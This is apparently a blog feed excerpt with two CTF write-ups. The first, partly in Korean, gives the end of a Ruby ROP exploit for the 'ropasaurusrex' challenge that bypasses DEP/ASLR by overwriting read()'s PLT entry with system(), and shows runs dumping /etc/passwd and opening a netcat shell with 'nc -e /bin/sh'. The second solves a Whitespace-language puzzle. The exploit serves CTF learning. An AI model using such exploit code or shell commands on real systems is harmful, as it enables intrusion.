<h1>From objdump -D ./ropasaurusrex | grep write</h1>

<p>write_addr = 0x0804830C</p>

<h1>From gdb, &ldquo;x/x system&rdquo;</h1>

<p>system_addr = 0xb7ec2450</p>

<h1>Fram objdump, &ldquo;pop/pop/pop/ret&rdquo;</h1>

<p>pppr_addr = 0x080484b6</p>

<h1>The location where read()&rsquo;s .plt entry is</h1>

<p>read_addr_ptr = 0x0804961c</p>

<h1>The difference between read() and system()</h1>

<h1>Calculated as  read (0xb7f48110) &ndash; system (0xb7ec2450)</h1>

<h1>Note: This is the one number that needs to be calculated using the</h1>

<h1>target version of libc rather than my own!</h1>

<p>read_system_diff = 0x85cc0</p>

<h1>Generate the payload</h1>

<p>payload = &ldquo;A&rdquo;*140 +
  [</p>

<pre><code># system()'s stack frame
buf,         # writable memory (cmd buf)
0x44444444,  # system()'s return address

# pop/pop/pop/ret's stack frame
# Note that this calls read_addr, which is overwritten by a pointer
# to system() in the previous stack frame
read_addr,   # (this will become system())

# second read()'s stack frame
# This reads the address of system() from the socket and overwrites
# read()'s .plt entry with it, so calls to read() end up going to
# system()
4,           # length of an address
read_addr_ptr, # address of read()'s .plt entry
0,           # stdin
pppr_addr,   # read()'s return address

# pop/pop/pop/ret's stack frame
read_addr,

# write()'s stack frame
# This frame gets the address of the read() function from the .plt
# entry and writes to to stdout
4,           # length of an address
read_addr_ptr, # address of read()'s .plt entry
1,           # stdout
pppr_addr,   # retrurn address

# pop/pop/pop/ret's stack frame
write_addr,

# read()'s stack frame
# This reads the command we want to run from the socket and puts it
# in our writable "buf"
cmd.length,  # number of bytes
buf,         # writable memory (cmd buf)
0,           # stdin
pppr_addr,   # read()'s return address

read_addr # Overwrite the original return
</code></pre>

<p>  ].reverse.pack(&ldquo;I*&rdquo;) # Convert a series of &lsquo;ints&rsquo; to a string</p>

<h1>Write the &lsquo;exploit&rsquo; payload</h1>

<p>s.write(payload)</p>

<h1>When our payload calls read() the first time, this is read</h1>

<p>s.write(cmd)</p>

<h1>Get the result of the first read() call, which is the actual address of read</h1>

<p>this_read_addr = s.read(4).unpack(&ldquo;I&rdquo;).first</p>

<h1>Calculate the address of system()</h1>

<p>this_system_addr = this_read_addr &ndash; read_system_diff</p>

<h1>Write the address back, where it&rsquo;ll be read() into the correct place by</h1>

<h1>the second read() call</h1>

<p>s.write([this_system_addr].pack(&ldquo;I&rdquo;))</p>

<h1>Finally, read the result of the actual command</h1>

<p>puts(s.read())</p>

<h1>Clean up</h1>

<p>s.close()
```</p>

<p>그리고 실행 결과다:</p>

<p><code>sh
$ ruby sploit.rb "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
[...]
</code></p>

<p>물론 <code>cat /etc/passwd</code>를 원하는 값으로 바꿀 수 있다 (netcat 리스너를 포함해서!).</p>

<p><code>sh
ron@debian-x86 ~ $ ruby sploit.rb "pwd"
/home/ron
ron@debian-x86 ~ $ ruby sploit.rb "whoami"
ron
ron@debian-x86 ~ $ ruby sploit.rb "nc -vv -l -p 5555 -e /bin/sh" &amp;
[1] 3015
ron@debian-x86 ~ $ nc -vv localhost 5555
debian-x86.skullseclabs.org [127.0.0.1] 5555 (?) open
pwd
/home/ron
whoami
ron
</code></p>

<h2>결론</h2>

<p>이게 끝이다! 난 믿을 만한, DEP/ASLR을 우회하는 ropasaurusrex 익스플로잇을 만들었다.</p>

<p>질문이 있다면 댓글을 달거나 나에게 연락해주길 바란다!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>링크가 <a href="https://wiki.skullsecurity.org/Assembly">바뀌었다</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ghost in the Shellcode 2014: inview Write-up]]></title>
    <link href="http://blog.yous.be/2014/01/20/ghost-in-the-shellcode-2014-inview-write-up/"/>
    <updated>2014-01-20T22:21:24+09:00</updated>
    <id>http://blog.yous.be/2014/01/20/ghost-in-the-shellcode-2014-inview-write-up</id>
    <content type="html"><![CDATA[<h2>Question 3 &ndash; inview</h2>

<blockquote><p>Points: 150</p>

<p>The key is in view, what is it? <a href="https://2014.ghostintheshellcode.com/inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155">File</a></p></blockquote>

<p>If the above link doesn&rsquo;t work, please use this <a href="/downloads/2014/01/20/inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155">link</a>.</p>

<p>Extract file with this code:</p>

<p><code>sh
mv inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155 inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155.xz
xz -d inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155.xz
</code></p>

<p>Then we can see some trailing whitespace in <code>inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155</code>.</p>

<h2>How to Highlight Trailing Whitespace in Vim</h2>

<p>Add this code to your <code>.vimrc</code>:</p>

<p><code>vim .vimrc
highlight ExtraWhitespace ctermbg=red guibg=red
autocmd BufWinEnter * match ExtraWhitespace /\s\+$/
autocmd InsertEnter * match ExtraWhitespace //
autocmd InsertLeave * match ExtraWhitespace /\s\+$/
if version &gt;= 702
  autocmd BufWinLeave * call clearmatches()
end
</code></p>

<p>Then <a href="http://www.vim.org">Vim</a> highlights trailing whitespace to red color.</p>

<h2>How to Solve</h2>

<p>I felt something weird, so I converted the file to hex code. In Vim:</p>

<pre><code>:%!xxd
</code></pre>

<p>Looking at whitespace, I realized there are <code>09(Tab)</code>, <code>0A(New Line)</code>, <code>20(Space)</code> with no rule. Right after that I came up with <a href="http://compsoc.dur.ac.uk/whitespace/">Whitespace</a>. Also there is a <a href="http://ws2js.luilak.net/interpreter.html">interpreter written in JavaScript</a>. Almost done! Just copy and paste the file content to site and press &lsquo;Exec&rsquo; button. If you want to execute it in local, you can use <a href="https://github.com/hostilefork/whitespacers">whitespacers</a>.</p>

<p>Finally the key is:</p>

<pre><code>WhitespaceProgrammingIsHard
</code></pre>
]]></content>
  </entry>
  
</feed>
